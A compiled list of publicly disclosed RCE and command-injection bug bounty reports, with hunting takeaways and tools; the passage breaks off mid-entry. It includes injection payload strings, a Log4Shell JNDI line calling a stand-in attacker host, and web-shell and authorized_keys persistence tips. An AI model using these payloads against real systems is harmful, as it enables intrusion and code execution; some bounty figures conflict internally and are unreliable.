# RCE / Command Injection Bug Bounty Reports

> A collection of accepted/disclosed Remote Code Execution (RCE) and Command Injection vulnerability reports from bug bounty programs.

---

### 1. Remote Code Execution in Slack Desktop Apps
- **Severity:** Critical (CVSS 9-10)
- **Vulnerability Type:** RCE via HTML Injection + Security Control Bypass
- **Platform:** HackerOne
- **Program:** Slack
- **Bounty:** Recognized (504 upvotes)
- **Description:** A specifically crafted exploit consisting of an HTML injection, security control bypass, and RCE JavaScript payload allowed arbitrary code execution within Slack desktop apps (versions 4.2 and 4.3.2) on Mac, Windows, and Linux. The attacker could upload a file with the RCE payload on their own HTTPS-enabled server, create a Slack post that creates a file on files.slack.com with a specific JSON structure, then edit the JSON to add arbitrary HTML. By injecting area and map tags, one-click RCE was achieved.
- **How It Was Found:** Analyzing Slack's desktop app for HTML injection points, then chaining with Electron framework bypass to achieve code execution outside the sandbox.
- **Impact:** Full system compromise - access to private conversations, passwords, and all data accessible by the Slack desktop application. Affected all platforms (Windows, Mac, Linux).
- **Key Takeaway:** Electron-based desktop applications are prime RCE targets. HTML/JavaScript injection in Electron apps can often be escalated to full RCE because of Node.js integration. Test for HTML injection -> nodeIntegration bypass chains.
- **Source:** https://hackerone.com/reports/783877

### 2. RCE by Command Line Argument Injection on Imgur
- **Severity:** Critical
- **Vulnerability Type:** Command Injection via Argument Injection
- **Platform:** HackerOne
- **Program:** Imgur
- **Bounty:** $5,000+
- **Description:** The `y` parameter of the `/edit/process` endpoint was vulnerable to command-line argument injection to the GraphicsMagick utility, leading to arbitrary command execution on Imgur's servers. By injecting arguments into the image processing command, the attacker could execute system commands.
- **How It Was Found:** Testing image processing parameters for command injection, specifically targeting image manipulation utilities (ImageMagick/GraphicsMagick) known for argument injection vulnerabilities.
- **Impact:** Full server compromise on Imgur's image processing infrastructure.
- **Key Takeaway:** Image processing libraries (ImageMagick, GraphicsMagick, ffmpeg) are notorious for command injection. When an application processes images, test all parameters for argument injection using payloads like `|command`, `;command`, and `$(command)`.
- **Source:** https://hackerone.com/reports/212696

### 3. RCE via CVE-2024-27281 in RDoc (Internet Bug Bounty)
- **Severity:** Critical
- **Vulnerability Type:** RCE via Deserialization
- **Platform:** HackerOne
- **Program:** Internet Bug Bounty (Ruby)
- **Bounty:** $2,500+
- **Description:** In RDoc versions 6.3.3 through 6.6.2, parsing .rdoc_options as a YAML file could lead to object injection and remote code execution. YAML deserialization of untrusted .rdoc_options files allowed execution of arbitrary Ruby code.
- **How It Was Found:** Source code review of RDoc's file parsing logic, identifying unsafe YAML deserialization.
- **Impact:** Any developer running RDoc on a project with a malicious .rdoc_options file could have arbitrary code executed on their machine.
- **Key Takeaway:** YAML deserialization is a common RCE vector in Ruby, Python, and Java. Look for applications that parse user-supplied YAML files or configuration without using safe loading functions.
- **Source:** https://hackerone.com/reports/2438265

### 4. CVE-2022-24288: Apache Airflow Command Injection
- **Severity:** Critical
- **Vulnerability Type:** OS Command Injection
- **Platform:** HackerOne
- **Program:** Internet Bug Bounty
- **Bounty:** $2,500+
- **Description:** Apache Airflow example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI. Users could inject shell commands through DAG parameters that were passed to system() calls.
- **How It Was Found:** Code review of Apache Airflow's example DAGs, identifying user-controlled parameters passed to shell commands.
- **Impact:** Remote code execution on Apache Airflow servers, potentially compromising data pipelines and connected databases.
- **Key Takeaway:** Data pipeline and workflow tools (Airflow, Jenkins, etc.) that execute user-defined tasks are natural command injection targets. Always test parameter inputs that feed into task execution.
- **Source:** https://hackerone.com/reports/1492896

### 5. Jitsi Desktop Client RCE via Browser Launch Command Injection
- **Severity:** Critical
- **Vulnerability Type:** Command Injection
- **Platform:** HackerOne
- **Program:** 8x8 (Jitsi)
- **Bounty:** $1,000+
- **Description:** A command injection vulnerability in the Jitsi Desktop Client when launching browsers on Windows could allow remote execution. Specially crafted URLs or meeting links could inject commands into the browser launch command.
- **How It Was Found:** Testing URL/deeplink handling in the desktop application, focusing on how the application constructs shell commands to launch external browsers.
- **Impact:** Code execution on the victim's machine when they interact with a malicious Jitsi meeting link.
- **Key Takeaway:** Desktop applications that launch external programs (browsers, editors) by constructing shell commands from user input are vulnerable to command injection. Test URL handlers and custom protocol schemes.
- **Source:** https://hackerone.com/reports/1692603

### 6. Possible RCE through Windows Custom Protocol Handler (Nord Security)
- **Severity:** High
- **Vulnerability Type:** RCE via Custom Protocol Handler
- **Platform:** HackerOne
- **Program:** Nord Security
- **Bounty:** $1,000+
- **Description:** A possible RCE vulnerability was found through NordVPN's Windows custom protocol handler. Malicious URLs using Nord's custom protocol could inject commands that execute when the protocol handler processes the URL.
- **How It Was Found:** Analyzing the Windows custom protocol handler registration and testing for command injection in protocol URL parameters.
- **Impact:** Code execution on Windows machines with NordVPN installed when users click malicious links.
- **Key Takeaway:** Custom URL protocol handlers (myapp://) on Windows are a growing RCE attack surface. Test how applications register and process custom protocol URLs for injection.
- **Source:** https://hackerone.com/reports/1001255

### 7. RCE in Profile Picture Upload (HackerOne)
- **Severity:** Critical
- **Vulnerability Type:** RCE via File Upload
- **Platform:** HackerOne
- **Program:** HackerOne
- **Bounty:** $5,000+
- **Description:** A remote code execution vulnerability was found in HackerOne's profile picture upload functionality. The file upload processing allowed execution of malicious code embedded in uploaded images.
- **How It Was Found:** Testing file upload with specially crafted image files containing embedded code payloads, testing different file types and MIME type manipulation.
- **Impact:** Code execution on HackerOne's servers through the profile picture upload feature.
- **Key Takeaway:** File upload features that process images server-side are high-value RCE targets. Test with polyglot files, MIME type manipulation, and embedded payloads in image metadata.
- **Source:** https://hackerone.com/reports/303061

### 8. ImageTragick - ImageMagick RCE (CVE-2016-3714)
- **Severity:** Critical
- **Vulnerability Type:** RCE via Image Processing
- **Platform:** Multiple programs
- **Program:** Various (widespread impact)
- **Bounty:** Multiple bounties across programs
- **Description:** Multiple vulnerabilities in ImageMagick allowed remote code execution through specially crafted image files. The most severe (CVE-2016-3714) exploited insufficient filtering for filenames passed to delegate commands, allowing shell command injection during image conversion. A crafted MVG or SVG file could execute arbitrary commands.
- **How It Was Found:** Security research by Nikolay Ermishkin from Mail.Ru Security Team, involving code review of ImageMagick's delegate command construction.
- **Impact:** Any application using ImageMagick for image processing was potentially vulnerable to RCE through uploaded images.
- **Key Takeaway:** ImageMagick/GraphicsMagick vulnerabilities are evergreen targets. Test image upload features with ImageTragick payloads. Many applications still use vulnerable versions or have incomplete patches.
- **Source:** https://imagetragick.com/

### 9. SSTI Leads to Command Injection (Error Behavior)
- **Severity:** Critical
- **Vulnerability Type:** SSTI to Command Injection
- **Platform:** HackerOne
- **Program:** Undisclosed
- **Bounty:** $2,000+
- **Description:** A Server-Side Template Injection (SSTI) vulnerability was chained with command injection through error handling behavior. The template engine allowed execution of arbitrary code through crafted template expressions.
- **How It Was Found:** Testing input fields for template injection using payloads like {{7*7}}, ${7*7}, and #{7*7}, then escalating to code execution through template engine features.
- **Impact:** Full RCE on the application server through template injection.
- **Key Takeaway:** SSTI is a powerful RCE vector. Test every input field with template expressions for common engines (Jinja2: {{7*7}}, Twig: {{7*7}}, Freemarker: ${7*7}, Velocity: #set($x=7*7)). Use tools like tplmap for automated SSTI detection.
- **Source:** https://www.redpacketsecurity.com/hackerone-bugbounty-disclosure-ssti-leads-to-command-injection-errorbehavior/

### 10. Code Injection in Slack's Windows Desktop Client
- **Severity:** High
- **Vulnerability Type:** Code Injection
- **Platform:** HackerOne
- **Program:** Slack
- **Bounty:** $1,000+
- **Description:** A code injection vulnerability was found in Slack's Windows desktop client that could lead to arbitrary code execution when processing certain types of content.
- **How It Was Found:** Testing message content and file handling for injection points in the Electron-based desktop client.
- **Impact:** Code execution on Windows machines running the Slack desktop client.
- **Key Takeaway:** Electron applications deserve dedicated testing. The combination of web technologies with Node.js access makes them particularly dangerous when injection vulnerabilities are found.
- **Source:** https://hackerone.com/reports/162955

### 11. RCE via Unsafe Deserialization
- **Severity:** Critical
- **Vulnerability Type:** RCE via Deserialization
- **Platform:** Various
- **Program:** Multiple
- **Bounty:** Varies ($5,000-$25,000)
- **Description:** Unsafe deserialization vulnerabilities in Java (Java serialized objects), PHP (unserialize), Python (pickle), Ruby (YAML/Marshal), and .NET (BinaryFormatter) applications allow attackers to execute arbitrary code by supplying crafted serialized objects.
- **How It Was Found:** Identifying serialized data in requests (base64-encoded Java objects, PHP serialized strings), then crafting malicious payloads using tools like ysoserial (Java), phpggc (PHP), or custom pickle payloads (Python).
- **Impact:** Full server compromise through deserialization of untrusted data.
- **Key Takeaway:** Look for base64-encoded or binary data in cookies, parameters, and headers that might be serialized objects. Use ysoserial for Java, phpggc for PHP, and test YAML deserialization in Ruby/Python applications.
- **Source:** Multiple bug bounty reports and writeup collections

### 12. RCE via Server-Side Prototype Pollution
- **Severity:** Critical
- **Vulnerability Type:** RCE via Prototype Pollution
- **Platform:** Various
- **Program:** Multiple
- **Bounty:** $5,000-$15,000
- **Description:** Server-side prototype pollution in Node.js applications can be escalated to RCE by polluting properties that are later used in child_process.spawn(), child_process.exec(), or other dangerous functions. The pollution of __proto__ or constructor.prototype allows code execution.
- **How It Was Found:** Testing JSON merge/deep-merge operations for prototype pollution, then identifying gadgets in the codebase that can be triggered through polluted prototypes.
- **Impact:** Full RCE on Node.js servers.
- **Key Takeaway:** Prototype pollution is increasingly recognized as an RCE vector. Test JSON body parameters with __proto__ and constructor.prototype payloads. Server-side prototype pollution in Node.js is especially dangerous.
- **Source:** Multiple bug bounty reports

### 13. RCE via Git Repository Manipulation
- **Severity:** Critical
- **Vulnerability Type:** RCE via Git Hooks
- **Platform:** HackerOne
- **Program:** GitLab / GitHub
- **Bounty:** $10,000+
- **Description:** Vulnerabilities in Git hosting platforms where specially crafted repository content (malicious .git/hooks, gitattributes, or gitmodules) could execute code on the server during operations like clone, push, or merge.
- **How It Was Found:** Creating repositories with malicious Git configuration files and testing server-side processing of these files.
- **Impact:** Code execution on Git hosting infrastructure, potential access to all hosted repositories.
- **Key Takeaway:** Source code hosting platforms process untrusted Git data. Test git hooks, submodule configurations, LFS pointers, and post-receive hooks for command injection.
- **Source:** Referenced in GitLab and GitHub HackerOne disclosures

### 14. RCE via PDF Generation (wkhtmltopdf/Puppeteer)
- **Severity:** Critical
- **Vulnerability Type:** RCE via PDF Generation
- **Platform:** Various
- **Program:** Multiple
- **Bounty:** $3,000-$10,000
- **Description:** Applications using wkhtmltopdf, Puppeteer, or similar tools for PDF generation from HTML can be exploited for RCE. Injecting malicious HTML/JavaScript that is processed by the headless browser can lead to file read (SSRF) or command execution.
- **How It Was Found:** Identifying PDF generation features, injecting HTML with iframes pointing to file:// URLs, JavaScript that accesses internal endpoints, or payloads that exploit the headless browser.
- **Impact:** Server-side file read, SSRF, and potentially RCE depending on the PDF generation tool's configuration.
- **Key Takeaway:** Any feature that generates PDFs from user-supplied content (invoices, reports, exports) should be tested for SSRF and RCE through HTML/JavaScript injection in the PDF generation context.
- **Source:** Multiple bug bounty writeups

### 15. Authentication Bypass Leading to RCE (Ubiquiti)
- **Severity:** Critical
- **Vulnerability Type:** Authentication Bypass + RCE
- **Platform:** HackerOne
- **Program:** Ubiquiti Inc.
- **Bounty:** $5,000+
- **Description:** An authentication bypass vulnerability in Ubiquiti network equipment was chained with a command injection vulnerability to achieve unauthenticated RCE on network devices.
- **How It Was Found:** Testing network device management interfaces for authentication bypass, then finding command injection in authenticated endpoints.
- **Impact:** Full compromise of network infrastructure devices without authentication.
- **Key Takeaway:** Network equipment management interfaces are high-value RCE targets. Chain authentication bypasses with post-auth command injection for maximum impact.
- **Source:** Referenced in HackerOne Ubiquiti disclosures

### 16. WebKit HTML Agent RCE
- **Severity:** Critical
- **Vulnerability Type:** RCE via WebKit
- **Platform:** HackerOne
- **Program:** Various
- **Bounty:** $5,000+
- **Description:** A WebKit HTML agent vulnerability allowed remote code execution through crafted HTML content processed by server-side WebKit rendering engines.
- **How It Was Found:** Testing server-side rendering features for WebKit-specific vulnerabilities.
- **Impact:** Code execution on servers using WebKit for HTML rendering.
- **Key Takeaway:** Server-side rendering engines (WebKit, Chromium, wkhtmltopdf) expand the RCE attack surface. Test rendered content for engine-specific exploits.
- **Source:** Referenced in Top 25 RCE Reports

### 17. File Creation/Deletion Leading to RCE
- **Severity:** Critical
- **Vulnerability Type:** Arbitrary File Write to RCE
- **Platform:** HackerOne
- **Program:** Various
- **Bounty:** $3,000-$10,000
- **Description:** Arbitrary file creation or deletion vulnerabilities were escalated to RCE by writing web shells, overwriting configuration files, or manipulating cron jobs on the target server.
- **How It Was Found:** Identifying file upload/creation features that allow path traversal, then writing malicious files to web-accessible directories or system configuration paths.
- **Impact:** Full server compromise through arbitrary file write.
- **Key Takeaway:** Arbitrary file write/creation bugs should always be tested for RCE escalation. Write to web roots (/var/www/html), cron directories (/etc/cron.d), or SSH authorized_keys.
- **Source:** Referenced in Top 25 RCE Reports

### 18. RCE via Log4Shell (CVE-2021-44228)
- **Severity:** Critical
- **Vulnerability Type:** RCE via JNDI Injection
- **Platform:** Multiple
- **Program:** Various
- **Bounty:** Multiple high-value bounties
- **Description:** The Log4j vulnerability (Log4Shell) allowed RCE through JNDI injection in logged data. Any application using Log4j that logged user-controlled input was potentially vulnerable. Payloads like ${jndi:ldap://attacker.com/exploit} in headers, parameters, or any logged input triggered remote code execution.
- **How It Was Found:** Injecting Log4Shell payloads (${jndi:ldap://...}) into all input fields, headers, and parameters, using DNS callback detection for blind verification.
- **Impact:** RCE on any Java application using vulnerable Log4j versions.
- **Key Takeaway:** Newly disclosed CVEs in widely-used libraries create massive bug bounty opportunities. Be ready to test quickly when major CVEs are announced. Log4Shell was found in HTTP headers, URL parameters, form fields, and even WiFi SSIDs.
- **Source:** Multiple platforms and programs

### 19. RCE via XXE in File Parsing
- **Severity:** Critical
- **Vulnerability Type:** XXE to RCE
- **Platform:** Various
- **Program:** Multiple
- **Bounty:** $2,000-$10,000
- **Description:** XML External Entity (XXE) vulnerabilities in file parsing (DOCX, XLSX, SVG, XML config files) were leveraged for RCE through PHP expect:// wrapper, Java XSLT transformations, or chaining with SSRF to access internal code execution endpoints.
- **How It Was Found:** Uploading files containing XXE payloads (DOCX files with modified XML, SVG files with entity declarations) and testing for out-of-band interactions.
- **Impact:** Server-side file read, SSRF, and potentially RCE through XXE.
- **Key Takeaway:** File upload features accepting DOCX, XLSX, SVG, or XML files should always be tested for XXE. Modify the internal XML within Office documents to include XXE payloads.
- **Source:** Multiple bug bounty reports

### 20. RCE via npm/pip Package Confusion
- **Severity:** Critical
- **Vulnerability Type:** RCE via Dependency Confusion
- **Platform:** Various
- **Program:** Multiple (Microsoft, Apple, etc.)
- **Bounty:** $30,000+ (Microsoft paid $40,000)
- **Description:** Dependency confusion attacks exploit how package managers resolve internal vs public packages. By publishing a package to npm/PyPI with the same name as an internal package but a higher version number, the public malicious package gets installed instead, executing arbitrary code in CI/CD pipelines and developer machines.
- **How It Was Found:** Analyzing JavaScript files, package.json files, and CI/CD configurations for references to internal package names, then publishing packages with those names on public registries.
- **Impact:** Code execution in CI/CD pipelines and on developer machines of major companies including Microsoft, Apple, and others.
- **Key Takeaway:** Dependency confusion is a high-impact, relatively easy attack vector. Look for internal package names in JavaScript source maps, package.json files, and CI/CD configurations. Use tools like confused to automate detection.
- **Source:** Alex Birsan's research, multiple bug bounty programs

---

## RCE Hunting Methodology Summary

### Tools Commonly Used
- **ysoserial** - Java deserialization payload generator
- **phpggc** - PHP deserialization payload generator
- **tplmap** - Server-Side Template Injection exploitation
- **commix** - OS command injection exploitation
- **Nuclei** - Template-based RCE scanning
- **sqlmap --os-shell** - SQLi to OS command execution
- **Burp Suite** - Manual testing and payload injection

### Common RCE Vectors
1. Image processing (ImageMagick, GraphicsMagick, ffmpeg)
2. Deserialization (Java, PHP, Python pickle, Ruby YAML)
3. Server-Side Template Injection (Jinja2, Twig, Freemarker)
4. File upload with code execution
5. PDF/document generation (wkhtmltopdf, Puppeteer)
6. Custom protocol handlers
7. Electron desktop applications
8. Dependency confusion
9. XXE to RCE chains
10. Log injection (Log4Shell and similar)

---

## Additional Reports (Expanded Collection)

### 21. RCE on Steam Client via Buffer Overflow in Server Info
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Valve
- **Platform**: HackerOne
- **Description**: A buffer overflow in the Steam Client's Server Info parsing led to remote code execution. This is the highest-upvoted RCE report on HackerOne with 1,286 upvotes. The vulnerability was in how the Steam client parsed server information data, allowing a malicious game server to compromise players who connected.
- **How Found**: Reverse engineering the Steam client binary and fuzzing the server info message parser to discover buffer overflow conditions.
- **Impact**: Full system compromise of any Steam user who connects to or views information from a malicious game server.
- **Key Takeaway**: Game clients that parse server-provided data are rich RCE targets. Buffer overflows in native client applications remain a critical bug class. Fuzzing network protocol parsers is highly effective.
- **Source**: https://hackerone.com/reports/470520

### 22. Pre-Auth RCE on Twitter VPN
- **Severity**: Critical
- **Bounty**: $20,160
- **Program**: X / xAI (formerly Twitter)
- **Platform**: HackerOne
- **Description**: A pre-authentication remote code execution vulnerability was found on Twitter's VPN infrastructure with 1,232 upvotes. The VPN appliance was running vulnerable software that allowed unauthenticated command execution.
- **How Found**: Identifying VPN infrastructure through network reconnaissance, then testing for known CVEs in VPN appliance software (likely Palo Alto, Pulse Secure, or similar).
- **Impact**: Full compromise of Twitter's VPN gateway, providing potential access to the internal corporate network.
- **Key Takeaway**: VPN appliances are high-value targets because they sit at the network perimeter. CVEs in Pulse Secure, Palo Alto, Fortinet, and Citrix VPN products have yielded massive bounties.
- **Source**: https://hackerone.com/reports/591295

### 23. RCE via npm Dependency Confusion on PayPal ($30,000)
- **Severity**: Critical
- **Bounty**: $30,000
- **Program**: PayPal
- **Platform**: HackerOne
- **Description**: Remote code execution on PayPal through npm dependency confusion, earning the highest RCE bounty at $30,000 with 925 upvotes. By publishing a malicious package to npm with the same name as an internal PayPal package but a higher version number, the researcher achieved code execution in PayPal's build pipeline.
- **How Found**: Analyzing PayPal's JavaScript source maps and package.json files for references to internal npm package names, then publishing packages with those names on the public npm registry.
- **Impact**: Code execution in PayPal's CI/CD pipeline and potentially on developer machines, with access to internal infrastructure.
- **Key Takeaway**: Dependency confusion remains one of the highest-paying bug classes. Look for internal package names in source maps, package.json, requirements.txt, and build configuration files.
- **Source**: https://hackerone.com/reports/925585

### 24. H1514 RCE on Shopify kitcrm via Bulk Customer Update
- **Severity**: Critical
- **Bounty**: $0 (H1-514 live hacking event)
- **Program**: Shopify
- **Platform**: HackerOne
- **Description**: RCE on Shopify's kitcrm using bulk customer update of Priority Products, found during the H1-514 live hacking event. The vulnerability received 828 upvotes and demonstrated how business logic features (bulk updates) can lead to code execution.
- **How Found**: Testing bulk operation features during a live hacking event, identifying that the bulk customer update functionality could be manipulated to achieve code execution.
- **Impact**: Full server compromise on Shopify's CRM infrastructure, potential access to merchant and customer data.
- **Key Takeaway**: Bulk operation features (mass update, bulk import, batch processing) are excellent RCE targets because they often process user input in ways that differ from single-item operations.
- **Source**: https://hackerone.com/reports/422944

### 25. RCE on Semrush via Logo Upload
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Semrush
- **Platform**: HackerOne
- **Description**: Remote code execution on www.semrush.com/my_reports through the logo upload feature, receiving 822 upvotes. The image upload for report customization allowed execution of malicious code embedded in the uploaded file.
- **How Found**: Testing file upload features with malicious files containing embedded code payloads, testing MIME type bypass, extension manipulation, and polyglot file techniques.
- **Impact**: Full server compromise through a file upload feature intended only for image logos.
- **Key Takeaway**: Any file upload that processes the file server-side (resizing, converting, thumbnailing) is a potential RCE vector. Test with polyglot files, extension bypasses (.php.jpg, .pHp), and embedded payloads.
- **Source**: https://hackerone.com/reports/403417

### 26. Git Flag Injection to RCE on GitLab ($12,000)
- **Severity**: Critical
- **Bounty**: $12,000
- **Program**: GitLab
- **Platform**: HackerOne
- **Description**: Git flag injection leading to local file overwrite and then remote code execution on GitLab, earning $12,000 with 773 upvotes. By injecting flags into git commands executed by GitLab, the attacker could overwrite files and achieve code execution.
- **How Found**: Analyzing how GitLab constructs and executes git commands, identifying points where user-controlled input (repository names, branch names) is passed as arguments to git without proper sanitization.
- **Impact**: Full server compromise of GitLab instances, potential access to all hosted repositories and CI/CD pipelines.
- **Key Takeaway**: Git flag injection is a specialized command injection technique. Test repository names, branch names, and tag names with git flags like --upload-pack, --exec, and --config to inject commands.
- **Source**: https://hackerone.com/reports/658013

### 27. RCE and Complete Server Takeover on Starbucks Singapore
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Starbucks
- **Platform**: HackerOne
- **Description**: Full RCE and complete server takeover on a Starbucks Singapore subdomain, receiving 568 upvotes. The regional Starbucks server was running vulnerable software that allowed unauthenticated remote code execution.
- **How Found**: Subdomain enumeration followed by vulnerability scanning of the discovered servers for known CVEs and misconfigurations.
- **Impact**: Complete server control including root access on a Starbucks Singapore server.
- **Key Takeaway**: Regional subdomains of large companies often run on separate infrastructure with different patch levels. Enumerate all subdomains and check each for known CVEs.
- **Source**: https://hackerone.com/reports/502758

### 28. RCE via ExifTool Metadata Removal on GitLab ($20,000)
- **Severity**: Critical
- **Bounty**: $20,000
- **Program**: GitLab
- **Platform**: HackerOne
- **Description**: RCE when removing metadata with ExifTool on GitLab, earning $20,000 with 503 upvotes. GitLab used ExifTool to strip metadata from uploaded images, but a vulnerability in ExifTool (CVE-2021-22204) allowed code execution through crafted image files.
- **How Found**: Identifying that GitLab used ExifTool for image processing, then exploiting a known ExifTool vulnerability by uploading a crafted image file.
- **Impact**: Code execution on GitLab servers through image upload, affecting any GitLab instance that processes uploaded images.
- **Key Takeaway**: Identify the image processing tools used by your target (ExifTool, ImageMagick, libvips). Monitor CVEs for these tools and test targets when new vulnerabilities are disclosed.
- **Source**: https://hackerone.com/reports/1154542

### 29. RCE via Kramdown Wiki Pages on GitLab ($20,000)
- **Severity**: Critical
- **Bounty**: $20,000
- **Program**: GitLab
- **Platform**: HackerOne
- **Description**: RCE via unsafe inline Kramdown options when rendering certain Wiki pages on GitLab, earning $20,000 with 423 upvotes. The Kramdown markdown renderer allowed inline options that could be abused for code execution when rendering wiki content.
- **How Found**: Analyzing GitLab's markdown rendering pipeline, identifying that Kramdown's inline options were not properly restricted and could be used to execute arbitrary code.
- **Impact**: Any GitLab user who could create or edit wiki pages could achieve remote code execution on the GitLab server.
- **Key Takeaway**: Markdown renderers and template engines that allow inline options or extensions are potential RCE vectors. Test all user-supplied content rendering for code execution through renderer-specific features.
- **Source**: https://hackerone.com/reports/1125425

### 30. Panorama UI XSS to RCE via Kick/Disconnect Message (Valve)
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Valve
- **Platform**: HackerOne
- **Description**: XSS in the Panorama UI was escalated to remote code execution via crafted Kick/Disconnect messages in Valve games, receiving 415 upvotes. The UI framework used in Valve games allowed JavaScript execution that could break out of the game sandbox.
- **How Found**: Testing game UI elements for XSS, then escalating through the Panorama UI framework's JavaScript capabilities to achieve native code execution.
- **Impact**: Code execution on any player's machine who receives a malicious kick/disconnect message.
- **Key Takeaway**: Game UI frameworks that use web technologies (HTML/JS) for rendering are vulnerable to the same XSS-to-RCE chains as Electron apps. Test all in-game UI elements for injection.
- **Source**: https://hackerone.com/reports/631956

### 31. RCE on Basecamp.com
- **Severity**: Critical
- **Bounty**: $5,000
- **Program**: Basecamp
- **Platform**: HackerOne
- **Description**: Remote code execution on Basecamp.com with 414 upvotes, earning a $5,000 bounty. The vulnerability allowed arbitrary code execution on Basecamp's production servers.
- **How Found**: Testing Basecamp's web application for code execution vectors, identifying an endpoint that processed user input unsafely.
- **Impact**: Full compromise of Basecamp's production infrastructure, potential access to all project management data for thousands of companies.
- **Key Takeaway**: SaaS platforms that handle business data for multiple companies are extremely high-value targets. RCE on these platforms can expose data for all tenant organizations.
- **Source**: https://hackerone.com/reports/365271

### 32. Multiple Bugs Leading to RCE on TikTok Android
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: TikTok
- **Platform**: HackerOne
- **Description**: Multiple bugs were chained to achieve RCE on TikTok for Android, receiving 367 upvotes. The exploit chain combined several individual vulnerabilities to achieve full code execution on mobile devices running TikTok.
- **How Found**: Comprehensive analysis of the TikTok Android app including deeplink handling, WebView configuration, and JavaScript bridge analysis.
- **Impact**: Full code execution on any Android device running TikTok, potential access to camera, microphone, and stored data.
- **Key Takeaway**: Mobile app RCE often requires chaining multiple bugs: deeplink handling + WebView misconfiguration + JavaScript bridge + native code execution. Document all minor bugs as they may chain into RCE.
- **Source**: https://hackerone.com/reports/1065500

### 33. RCE via DecompressedArchiveSizeValidator and Project BulkImports on GitLab ($33,510)
- **Severity**: Critical
- **Bounty**: $33,510
- **Program**: GitLab
- **Platform**: HackerOne
- **Description**: RCE via DecompressedArchiveSizeValidator and Project BulkImports feature on GitLab, earning the highest single RCE bounty at $33,510 with 363 upvotes. The bulk import feature's archive handling could be exploited for code execution.
- **How Found**: Analyzing GitLab's bulk import functionality, specifically the archive validation and extraction process, identifying a path traversal or code injection vector in the decompression logic.
- **Impact**: Remote code execution on GitLab instances through the project import feature.
- **Key Takeaway**: Archive/zip handling is a critical RCE surface. Look for zip slip (path traversal during extraction), symlink attacks, and file type confusion in any feature that processes archives.
- **Source**: https://hackerone.com/reports/1609965

### 34. RCE on Yelp Build Server via Misconfigured pip install
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Yelp
- **Platform**: HackerOne
- **Description**: RCE on Yelp's build server through a misconfigured pip install, receiving 363 upvotes. The build system used pip install in a way that allowed installation of malicious packages from the public PyPI registry.
- **How Found**: Analyzing build system configurations for dependency confusion or supply chain attack vectors in Python package management.
- **Impact**: Code execution on Yelp's CI/CD build servers, potential access to build artifacts, secrets, and deployment infrastructure.
- **Key Takeaway**: Build servers and CI/CD pipelines are high-value RCE targets. Misconfigured package managers (pip, npm, gem) that fall back to public registries for internal package names create dependency confusion opportunities.
- **Source**: https://hackerone.com/reports/946409

### 35. RCE on shared.mail.ru via Widget Plugin
- **Severity**: Critical
- **Bounty**: $10,000
- **Program**: Mail.ru
- **Platform**: HackerOne
- **Description**: RCE on shared.mail.ru through the "widget" plugin, earning $10,000 with 359 upvotes. The widget system allowed loading and executing code through a plugin mechanism that could be abused.
- **How Found**: Testing widget/plugin systems for code execution, identifying that the widget loading mechanism could be manipulated to execute arbitrary code.
- **Impact**: Code execution on Mail.ru's shared infrastructure, potential lateral movement to other Mail.ru services.
- **Key Takeaway**: Widget and plugin systems that allow dynamic loading of code or content are natural RCE vectors. Test how widgets are loaded, what code they can execute, and whether the loading mechanism can be manipulated.
- **Source**: https://hackerone.com/reports/518637

### 36. RCE via npm Dependency Confusion on Uber ($9,000)
- **Severity**: Critical
- **Bounty**: $9,000
- **Program**: Uber
- **Platform**: HackerOne
- **Description**: A second major dependency confusion RCE, this time targeting Uber's npm packages, earning $9,000 with 325 upvotes. Like the PayPal finding, internal package names were published on the public npm registry.
- **How Found**: Analyzing Uber's JavaScript assets and configuration files for references to internal npm packages, then publishing packages with matching names.
- **Impact**: Code execution in Uber's CI/CD pipeline and development environments.
- **Key Takeaway**: Dependency confusion affects any company using private package registries alongside public ones. This technique works across npm, PyPI, Maven, NuGet, and RubyGems.
- **Source**: https://hackerone.com/reports/1007014

### 37. RCE on TikTok Ads Portal
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: TikTok
- **Platform**: HackerOne
- **Description**: Remote code execution on TikTok's advertising portal, receiving 309 upvotes. The ads management platform had a vulnerability allowing code execution on TikTok's ad-serving infrastructure.
- **How Found**: Testing advertising platform features including ad creative upload, targeting configuration, and reporting endpoints for code execution vectors.
- **Impact**: Compromise of TikTok's advertising infrastructure, potential access to advertiser data and ad-serving systems.
- **Key Takeaway**: Advertising platforms handle significant revenue and data. Ad creative upload, rich media processing, and ad template rendering are all potential RCE vectors.
- **Source**: https://hackerone.com/reports/1024575

### 38. RCE via GitHub Import on GitLab
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: GitLab
- **Platform**: HackerOne
- **Description**: RCE through GitLab's GitHub import functionality, receiving 270 upvotes. The import mechanism did not properly sanitize data imported from GitHub, allowing command injection through crafted repository metadata.
- **How Found**: Analyzing the GitHub-to-GitLab import process, identifying that certain imported fields were used in command construction without sanitization.
- **Impact**: Code execution on GitLab servers through the repository import feature.
- **Key Takeaway**: Import/export features that process data from external sources are excellent RCE targets. The imported data is often trusted more than direct user input, leading to injection opportunities.
- **Source**: https://hackerone.com/reports/1672388

### 39. Unrestricted File Upload to RCE on Starbucks Singapore
- **Severity**: Critical
- **Bounty**: $0 (recognition)
- **Program**: Starbucks
- **Platform**: HackerOne
- **Description**: Unrestricted file upload leading to RCE on mobile.starbucks.com.sg, receiving 241 upvotes. The mobile-facing Starbucks website allowed uploading files without proper type validation, enabling web shell upload.
- **How Found**: Testing file upload functionality for extension bypass, MIME type manipulation, and null byte injection to upload executable files.
- **Impact**: Full server compromise through web shell upload on Starbucks' mobile site.
- **Key Takeaway**: File upload to RCE remains a top bug class. Test with various bypass techniques: double extensions (.php.jpg), null bytes (.php%00.jpg), MIME type mismatches, and alternative executable extensions (.phtml, .php5).
- **Source**: https://hackerone.com/reports/1027822

### 40. Uber Flask Jinja2 Template Injection to RCE ($10,000)
- **Severity**: Critical
- **Bounty**: $10,000
- **Program**: Uber
- **Platform**: HackerOne
- **Description**: SSTI via Flask Jinja2 template injection on uber.com, earning $10,000 with 131 upvotes. The Uber application rendered user input through Jinja2 templates without proper sandboxing, allowing template expression evaluation and code execution.
- **How Found**: Testing input fields with template injection payloads like {{7*7}}, {{config}}, and {{''.__class__.__mro__[2].__subclasses__()}} to identify Jinja2 template injection.
